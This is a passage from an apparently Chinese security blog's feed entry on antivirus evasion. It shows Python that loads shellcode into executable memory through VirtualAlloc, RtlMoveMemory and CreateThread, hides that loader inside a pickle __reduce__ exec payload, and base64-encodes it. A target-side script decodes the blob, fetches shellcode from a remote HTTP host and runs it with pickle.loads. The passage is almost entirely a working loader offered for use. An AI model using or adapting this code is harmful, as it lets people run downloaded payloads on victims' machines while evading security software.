class="hljs-string">shellcode = base64.b64decode(shellcode)</span><br><span class="hljs-string">shellcode = codecs.escape_decode(shellcode)[0]</span><br><span class="hljs-string">shellcode = bytearray(shellcode)</span><br><span class="hljs-string"># 设置VirtualAlloc返回类型为ctypes.c_void_p</span><br><span class="hljs-string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="hljs-string"># 申请内存</span><br><span class="hljs-string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 放入shellcode</span><br><span class="hljs-string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="hljs-string">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="hljs-string">    ctypes.c_void_p(ptr), </span><br><span class="hljs-string">    buf, </span><br><span class="hljs-string">    ctypes.c_int(len(shellcode))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="hljs-string">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_void_p(ptr), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 等待上面创建的线程运行完</span><br><span class="hljs-string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (shellcode,))<br><br><br>ret = pickle.dumps(A())<br>ret_base64 = base64.b64encode(ret)<br>print(ret_base64)<br><br></code></pre></td></tr></table></figure><p>下面这是在目标机器上执行的脚本，其中<code>shellcode</code>变量的值是上面脚本输出的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-comment">#该shellcode是上面脚本输出的数据。</span><br>shellcode = <span class="hljs-string">b&#x27;gANjYnVpbHRpbnMKZXhlYwpxAFgMBAAACgoKc2hlbGxjb2RlID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vMTkyLjE2OC4xOTkuMjQ2OjY2NjYvc2hlbGxjb2RlLnR4dCcpLmNvbnRlbnQKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9IGNvZGVjcy5lc2NhcGVfZGVjb2RlKHNoZWxsY29kZSlbMF0Kc2hlbGxjb2RlID0gYnl0ZWFycmF5KHNoZWxsY29kZSkKIyDorr7nva5WaXJ0dWFsQWxsb2Pov5Tlm57nsbvlnovkuLpjdHlwZXMuY192b2lkX3AKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3ZvaWRfcAojIOeUs+ivt+WGheWtmApwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCgojIOaUvuWFpXNoZWxsY29kZQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeSgKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGJ1ZiwgCiAgICBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpCikKIyDliJvlu7rkuIDkuKrnur/nqIvku45zaGVsbGNvZGXpmLLmraLkvY3nva7pppblnLDlnYDlvIDlp4vmiafooYwKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3ZvaWRfcChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQopCiMg562J5b6F5LiK6Z2i5Yib5bu655qE57q/56iL6L+Q6KGM5a6MCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSxjdHlwZXMuY19pbnQoLTEpKXEBhXECUnEDLg==&#x27;</span><br>pickle.loads(base64.b64decode(shellcode))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    突然想学学python是如何加载shellcode的。&lt;/p&gt;
&lt;h1 id=&quot;2-代码&quot;&gt;&lt;a href=&quot;#2</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
</feed>
